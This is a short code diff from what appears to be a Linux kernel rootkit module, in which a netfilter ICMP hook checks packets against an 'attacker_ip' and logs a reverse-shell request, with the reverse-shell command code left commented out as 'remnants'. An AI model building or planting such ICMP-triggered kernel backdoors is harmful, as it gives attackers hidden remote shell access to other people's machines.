@@ -432,7 +432,8 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
 		printk(KERN_INFO "ICMP from %pI4 to %pI4\n", &ip_header->saddr, &ip_header->daddr);
 
 		if (attacker_ip == ip_header->saddr) {
-			char* cmd;
+			// Remnants of rev_shell
+			// char* cmd;
 			printk(KERN_INFO "Reverse shell request found!\n");
 			// Remnants of rev_shell
 			// cmd = create_reverse_shell_cmd();
